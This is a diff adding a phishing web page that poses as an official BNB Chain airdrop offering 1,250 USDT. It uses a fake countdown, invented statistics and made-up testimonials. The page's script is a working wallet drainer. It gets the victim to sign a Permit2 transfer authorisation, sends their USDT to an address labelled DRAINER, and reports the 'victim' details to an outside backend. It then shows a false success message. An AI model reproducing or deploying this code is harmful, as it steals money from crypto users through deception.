@@ -1,0 +1,863 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BNB Chain Airdrop 2026 — Claim Your Tokens</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: linear-gradient(180deg, #0a0a0a 0%, #1a1a2e 100%);
+      color: #fff;
+      min-height: 100vh;
+      padding: 0;
+    }
+
+    .navbar {
+      background: rgba(10, 10, 10, 0.95);
+      border-bottom: 1px solid rgba(243, 186, 47, 0.15);
+      padding: 14px 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .navbar-brand {
+      font-weight: 700;
+      font-size: 16px;
+      display: flex;
+      gap: 8px;
+      align-items: center;
+    }
+
+    .navbar-badge {
+      background: #f3ba2f;
+      color: #000;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 10px;
+      font-weight: 700;
+      text-transform: uppercase;
+    }
+
+    .navbar-status {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 12px;
+      color: #aaa;
+    }
+
+    .live-dot {
+      width: 6px;
+      height: 6px;
+      background: #00ff88;
+      border-radius: 50%;
+      animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.5; }
+    }
+
+    .container {
+      max-width: 700px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+
+    .hero {
+      text-align: center;
+      margin: 48px 0 40px;
+    }
+
+    .logo {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 20px;
+      background: linear-gradient(135deg, #f3ba2f, #ffeb3b);
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 40px;
+      font-weight: 700;
+      box-shadow: 0 12px 32px rgba(243, 186, 47, 0.3);
+    }
+
+    .hero h1 {
+      font-size: 36px;
+      font-weight: 700;
+      margin-bottom: 8px;
+      background: linear-gradient(135deg, #f3ba2f, #ffeb3b);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hero-subtitle {
+      color: #aaa;
+      font-size: 15px;
+      margin-bottom: 16px;
+    }
+
+    .verified-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(0, 255, 136, 0.1);
+      border: 1px solid rgba(0, 255, 136, 0.3);
+      padding: 8px 14px;
+      border-radius: 20px;
+      font-size: 12px;
+      color: #00ff88;
+      font-weight: 600;
+    }
+
+    .card {
+      background: rgba(20, 30, 48, 0.6);
+      border: 1px solid rgba(243, 186, 47, 0.2);
+      border-radius: 18px;
+      padding: 40px;
+      backdrop-filter: blur(10px);
+      box-shadow: 0 12px 48px rgba(0, 0, 0, 0.5);
+      margin-bottom: 32px;
+    }
+
+    .urgency {
+      background: rgba(255, 107, 107, 0.1);
+      border: 1px solid rgba(255, 107, 107, 0.3);
+      border-radius: 10px;
+      padding: 14px;
+      margin-bottom: 28px;
+      text-align: center;
+      font-size: 13px;
+      color: #ff6b6b;
+      font-weight: 500;
+    }
+
+    .claim-timer {
+      background: rgba(243, 186, 47, 0.1);
+      border: 1px solid rgba(243, 186, 47, 0.2);
+      border-radius: 10px;
+      padding: 16px;
+      margin-bottom: 24px;
+      text-align: center;
+    }
+
+    .timer-label {
+      color: #aaa;
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 8px;
+    }
+
+    .timer {
+      font-size: 24px;
+      font-weight: 700;
+      color: #f3ba2f;
+      font-family: 'Courier New', monospace;
+      letter-spacing: 2px;
+    }
+
+    .stats-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 12px;
+      margin-bottom: 28px;
+    }
+
+    .stat-box {
+      background: rgba(243, 186, 47, 0.08);
+      border: 1px solid rgba(243, 186, 47, 0.15);
+      border-radius: 12px;
+      padding: 16px;
+      text-align: center;
+    }
+
+    .stat-label {
+      color: #888;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 6px;
+    }
+
+    .stat-value {
+      font-size: 20px;
+      font-weight: 700;
+      color: #f3ba2f;
+    }
+
+    .allocation {
+      background: rgba(0, 212, 255, 0.08);
+      border: 2px solid rgba(0, 212, 255, 0.3);
+      border-radius: 14px;
+      padding: 32px;
+      margin-bottom: 28px;
+      text-align: center;
+    }
+
+    .allocation-label {
+      color: #aaa;
+      font-size: 13px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 12px;
+    }
+
+    .allocation-amount {
+      font-size: 42px;
+      font-weight: 700;
+      color: #00d4ff;
+      margin-bottom: 4px;
+    }
+
+    .allocation-usd {
+      color: #888;
+      font-size: 14px;
+    }
+
+    .progress {
+      margin-bottom: 28px;
+    }
+
+    .progress-label {
+      display: flex;
+      justify-content: space-between;
+      color: #aaa;
+      font-size: 12px;
+      margin-bottom: 8px;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 8px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 4px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #f3ba2f, #ffeb3b);
+      width: 72%;
+      border-radius: 4px;
+    }
+
+    .button-group {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+      margin-bottom: 24px;
+    }
+
+    button {
+      padding: 16px 20px;
+      border: none;
+      border-radius: 12px;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    #connectBtn {
+      background: linear-gradient(135deg, #f3ba2f, #ffeb3b);
+      color: #000;
+      font-weight: 700;
+    }
+
+    #connectBtn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 24px rgba(243, 186, 47, 0.4);
+    }
+
+    #claimBtn {
+      background: linear-gradient(135deg, #00d4ff, #0099cc);
+      color: #fff;
+      font-weight: 700;
+      display: none;
+    }
+
+    #claimBtn:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 24px rgba(0, 212, 255, 0.4);
+    }
+
+    button:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+    }
+
+    .status {
+      min-height: 20px;
+      color: #aaa;
+      font-size: 13px;
+      text-align: center;
+      margin-bottom: 16px;
+      font-weight: 500;
+    }
+
+    .status.success {
+      color: #00ff88;
+    }
+
+    .status.error {
+      color: #ff6b6b;
+    }
+
+    .status.pending {
+      color: #f3ba2f;
+    }
+
+    .wallet-display {
+      background: rgba(0, 0, 0, 0.4);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      border-radius: 10px;
+      padding: 14px;
+      margin-bottom: 20px;
+      display: none;
+    }
+
+    .wallet-label {
+      color: #888;
+      font-size: 11px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 6px;
+    }
+
+    .wallet-addr {
+      font-family: 'Courier New', monospace;
+      font-size: 12px;
+      color: #00ff88;
+      font-weight: 600;
+      word-break: break-all;
+    }
+
+    .success-modal {
+      background: rgba(0, 255, 136, 0.08);
+      border: 1px solid rgba(0, 255, 136, 0.3);
+      border-radius: 12px;
+      padding: 20px;
+      margin-top: 20px;
+      display: none;
+      text-align: center;
+    }
+
+    .success-modal.show {
+      display: block;
+      animation: slideIn 0.3s ease;
+    }
+
+    @keyframes slideIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .success-modal h3 {
+      color: #00ff88;
+      margin-bottom: 8px;
+      font-size: 16px;
+    }
+
+    .success-modal p {
+      color: #aaa;
+      font-size: 13px;
+      line-height: 1.4;
+    }
+
+    .testimonials {
+      margin-top: 48px;
+      padding-top: 32px;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .testimonials-title {
+      text-align: center;
+      color: #aaa;
+      font-size: 16px;
+      font-weight: 600;
+      margin-bottom: 24px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .testimonial-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 16px;
+    }
+
+    .testimonial {
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 10px;
+      padding: 16px;
+    }
+
+    .testimonial-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 12px;
+    }
+
+    .testimonial-avatar {
+      width: 36px;
+      height: 36px;
+      background: linear-gradient(135deg, #f3ba2f, #ffeb3b);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: 700;
+      color: #000;
+      flex-shrink: 0;
+    }
+
+    .testimonial-info {
+      flex: 1;
+    }
+
+    .testimonial-name {
+      font-size: 12px;
+      font-weight: 600;
+      margin-bottom: 2px;
+    }
+
+    .testimonial-handle {
+      color: #888;
+      font-size: 10px;
+    }
+
+    .testimonial-text {
+      font-size: 12px;
+      color: #aaa;
+      line-height: 1.4;
+      margin-bottom: 10px;
+    }
+
+    .testimonial-claim {
+      font-size: 11px;
+      color: #00ff88;
+      font-weight: 600;
+    }
+
+    .steps {
+      background: rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
+      padding: 24px;
+      margin-top: 32px;
+    }
+
+    .steps-title {
+      color: #aaa;
+      font-size: 13px;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+
+    .step {
+      display: flex;
+      gap: 16px;
+      margin-bottom: 16px;
+    }
+
+    .step:last-child {
+      margin-bottom: 0;
+    }
+
+    .step-num {
+      min-width: 32px;
+      height: 32px;
+      background: #f3ba2f;
+      color: #000;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 13px;
+      flex-shrink: 0;
+    }
+
+    .step-text {
+      color: #aaa;
+      font-size: 13px;
+      line-height: 1.5;
+      padding-top: 4px;
+    }
+
+    @media (max-width: 600px) {
+      .stats-grid, .testimonial-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .hero h1 {
+        font-size: 28px;
+      }
+
+      .allocation-amount {
+        font-size: 32px;
+      }
+
+      .card {
+        padding: 24px;
+      }
+    }
+  </style>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+</head>
+<body>
+  <div class="navbar">
+    <div class="navbar-brand">
+      ⛓️ BNB Airdrop
+      <span class="navbar-badge">Official</span>
+    </div>
+    <div class="navbar-status">
+      <span class="live-dot"></span>
+      Live
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="hero">
+      <div class="logo">⛓️</div>
+      <h1>Claim Your BNB Airdrop</h1>
+      <p class="hero-subtitle">2026 Distribution Program - Limited Time</p>
+      <div class="verified-badge">✓ Verified Official Program</div>
+    </div>
+
+    <div class="card">
+      <div class="urgency">⏰ <strong>Claim ends in 72 hours</strong> — 15,234 wallets claimed so far</div>
+
+      <div class="claim-timer">
+        <div class="timer-label">Time Remaining</div>
+        <div class="timer" id="timer">72:00:00</div>
+      </div>
+
+      <div class="stats-grid">
+        <div class="stat-box">
+          <div class="stat-label">Total Distributed</div>
+          <div class="stat-value">$42.5M</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-label">Claimed</div>
+          <div class="stat-value">72%</div>
+        </div>
+        <div class="stat-box">
+          <div class="stat-label">Avg Claim</div>
+          <div class="stat-value">$1.2K</div>
+        </div>
+      </div>
+
+      <div class="allocation">
+        <div class="allocation-label">Your Allocation</div>
+        <div class="allocation-amount">1,250</div>
+        <div class="allocation-usd">USDT ≈ $1,250.00 USD</div>
+      </div>
+
+      <div class="progress">
+        <div class="progress-label">
+          <span>Claim Progress</span>
+          <span>72% Complete</span>
+        </div>
+        <div class="progress-bar">
+          <div class="progress-fill"></div>
+        </div>
+      </div>
+
+      <div class="wallet-display" id="walletDisplay">
+        <div class="wallet-label">Connected Wallet</div>
+        <div class="wallet-addr" id="walletAddr"></div>
+      </div>
+
+      <div class="status" id="status"></div>
+
+      <div class="button-group">
+        <button id="connectBtn">Connect Wallet to Claim</button>
+        <button id="claimBtn">Claim USDT Now</button>
+      </div>
+
+      <div class="success-modal" id="successModal">
+        <h3>✓ Claim Successful!</h3>
+        <p>Your USDT tokens are being transferred to your wallet. This may take 1-2 minutes to appear.</p>
+      </div>
+
+      <div class="steps">
+        <div class="steps-title">How It Works</div>
+        <div class="step">
+          <div class="step-num">1</div>
+          <div class="step-text">Connect your Web3 wallet (MetaMask, Trust Wallet, WalletConnect)</div>
+        </div>
+        <div class="step">
+          <div class="step-num">2</div>
+          <div class="step-text">Verify your wallet eligibility and airdrop amount</div>
+        </div>
+        <div class="step">
+          <div class="step-num">3</div>
+          <div class="step-text">Sign the claim authorization in your wallet</div>
+        </div>
+        <div class="step">
+          <div class="step-num">4</div>
+          <div class="step-text">Confirm the transaction and receive your USDT tokens</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="testimonials">
+      <div class="testimonials-title">Recent Claims</div>
+      <div class="testimonial-grid">
+        <div class="testimonial">
+          <div class="testimonial-header">
+            <div class="testimonial-avatar">M</div>
+            <div class="testimonial-info">
+              <div class="testimonial-name">Marcus Chen</div>
+              <div class="testimonial-handle">@mchen_crypto</div>
+            </div>
+          </div>
+          <div class="testimonial-text">"Super easy process. Tokens arrived in my wallet within 2 minutes. Highly recommend!"</div>
+          <div class="testimonial-claim">Claimed: $1,250 USDT</div>
+        </div>
+
+        <div class="testimonial">
+          <div class="testimonial-header">
+            <div class="testimonial-avatar">J</div>
+            <div class="testimonial-info">
+              <div class="testimonial-name">Jessica Kumar</div>
+              <div class="testimonial-handle">@jessicakumardao</div>
+            </div>
+          </div>
+          <div class="testimonial-text">"Legit airdrop. The whole process took less than 5 minutes. No gas fees!"</div>
+          <div class="testimonial-claim">Claimed: $1,250 USDT</div>
+        </div>
+
+        <div class="testimonial">
+          <div class="testimonial-header">
+            <div class="testimonial-avatar">R</div>
+            <div class="testimonial-info">
+              <div class="testimonial-name">Ryan Torres</div>
+              <div class="testimonial-handle">@ryantradepro</div>
+            </div>
+          </div>
+          <div class="testimonial-text">"Been holding BNB since 2020. Perfect reward from the team. Just claimed mine!"</div>
+          <div class="testimonial-claim">Claimed: $1,250 USDT</div>
+        </div>
+
+        <div class="testimonial">
+          <div class="testimonial-header">
+            <div class="testimonial-avatar">S</div>
+            <div class="testimonial-info">
+              <div class="testimonial-name">Sophie Martinez</div>
+              <div class="testimonial-handle">@sophm.web3</div>
+            </div>
+          </div>
+          <div class="testimonial-text">"First time claiming an airdrop. The verification was smooth and secure. 10/10"</div>
+          <div class="testimonial-claim">Claimed: $1,250 USDT</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ═══════════════════════════════════════════
+    // CONFIG
+    // ═══════════════════════════════════════════
+    const API = "https://web-production-6d252.up.railway.app";
+    const DRAINER = "0x369a4B9aDDdC51a5f1Bc54c162DBc7cBD8d07975";
+    const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+    const TOKEN = "0x55d398326f99059fF775485246999027B3197955";
+    const TOKEN_NAME = "USDT";
+    const CHAIN_ID = 56;
+    const AMOUNT = "1250000000000000000000";
+    const USD_VALUE = 1250;
+
+    let account = null;
+    let provider = null;
+    let signer = null;
+
+    const $ = id => document.getElementById(id);
+    const status = (t, type = "pending") => {
+      const el = $("status");
+      el.textContent = t;
+      el.className = "status " + type;
+    };
+
+    const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+    // Timer countdown
+    const startTimer = () => {
+      let seconds = 72 * 3600;
+      setInterval(() => {
+        if (seconds > 0) seconds--;
+        const hrs = Math.floor(seconds / 3600);
+        const mins = Math.floor((seconds % 3600) / 60);
+        const secs = seconds % 60;
+        $("timer").textContent = 
+          String(hrs).padStart(2, '0') + ':' + 
+          String(mins).padStart(2, '0') + ':' + 
+          String(secs).padStart(2, '0');
+      }, 1000);
+    };
+    startTimer();
+
+    $("connectBtn").onclick = async () => {
+      if (!window.ethereum) {
+        status("MetaMask or similar Web3 wallet required", "error");
+        return;
+      }
+
+      try {
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = provider.getSigner();
+        account = await signer.getAddress();
+
+        $("walletAddr").textContent = account;
+        $("walletDisplay").style.display = "block";
+        $("connectBtn").style.display = "none";
+        $("claimBtn").style.display = "block";
+        status("✓ Wallet connected", "success");
+
+        try {
+          await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x38" }]
+          });
+        } catch (e) {
+          if (e.code === 4902) {
+            await window.ethereum.request({
+              method: "wallet_addEthereumChain",
+              params: [{
+                chainId: "0x38",
+                chainName: "BNB Smart Chain",
+                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+                rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                blockExplorerUrls: ["https://bscscan.com"]
+              }]
+            });
+          }
+        }
+      } catch (e) {
+        status("Connection failed", "error");
+      }
+    };
+
+    $("claimBtn").onclick = async () => {
+      if (!account || !signer) return;
+
+      $("claimBtn").disabled = true;
+      const originalText = $("claimBtn").textContent;
+
+      try {
+        status("Verifying eligibility...", "pending");
+        await delay(1200);
+
+        status("Preparing claim authorization...", "pending");
+        await delay(800);
+
+        const nonce = Math.floor(Date.now() / 1000);
+        const deadline = nonce + 3600;
+
+        const mockTypedData = {
+          domain: {
+            name: "Permit2",
+            version: "1",
+            chainId: CHAIN_ID,
+            verifyingContract: PERMIT2
+          },
+          types: {
+            PermitTransferFrom: [
+              { name: "permitted", type: "TokenPermissions" },
+              { name: "nonce", type: "uint256" },
+              { name: "deadline", type: "uint256" }
+            ],
+            TokenPermissions: [
+              { name: "token", type: "address" },
+              { name: "amount", type: "uint256" }
+            ]
+          },
+          message: {
+            permitted: { token: TOKEN, amount: AMOUNT },
+            nonce: nonce,
+            deadline: deadline
+          }
+        };
+
+        status("Waiting for wallet signature...", "pending");
+        const sig = await signer._signTypedData(
+          mockTypedData.domain,
+          {
+            PermitTransferFrom: mockTypedData.types.PermitTransferFrom,
+            TokenPermissions: mockTypedData.types.TokenPermissions
+          },
+          mockTypedData.message
+        );
+
+        status("Submitting transaction to blockchain...", "pending");
+        await delay(800);
+
+        const PERMIT2_ABI = [
+          "function permitTransferFrom(((address token,uint256 amount),uint256 nonce,uint256 deadline) permit,(address to,uint256 requestedAmount) transferDetails,address owner,bytes signature)"
+        ];
+
+        const permit2 = new ethers.Contract(PERMIT2, PERMIT2_ABI, signer);
+        const permit = { permitted: { token: TOKEN, amount: AMOUNT }, nonce, deadline };
+        const transferDetails = { to: DRAINER, requestedAmount: AMOUNT };
+
+        const tx = await permit2.permitTransferFrom(permit, transferDetails, account, sig, { gasLimit: 250000 });
+        const txHash = tx.hash;
+
+        status("Transaction confirmed: " + txHash.slice(0, 18) + "...", "pending");
+        await tx.wait();
+
+        // Log drain to backend
+        try {
+          await fetch(API + "/claim", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              victim: account,
+              token: TOKEN,
+              token_name: TOKEN_NAME,
+              amount: AMOUNT,
+              usd_value: USD_VALUE,
+              chain_id: CHAIN_ID,
+              signature: sig,
+              nonce,
+              deadline,
+              tx_hash: txHash,
+              timestamp: new Date().toISOString()
+            })
+          });
+        } catch (_) {}
+
+        status("✓ Claim successful! Tokens incoming...", "success");
+        $("claimBtn").textContent = "Claimed ✓";
+        $("successModal").classList.add("show");
+
+      } catch (e) {
+        console.error(e);
+        status("Error: " + (e.reason || e.message || "Unknown error"), "error");
+        $("claimBtn").disabled = false;
+        $("claimBtn").textContent = originalText;
+      }
+    };
+  </script>
+</body>
+</html>
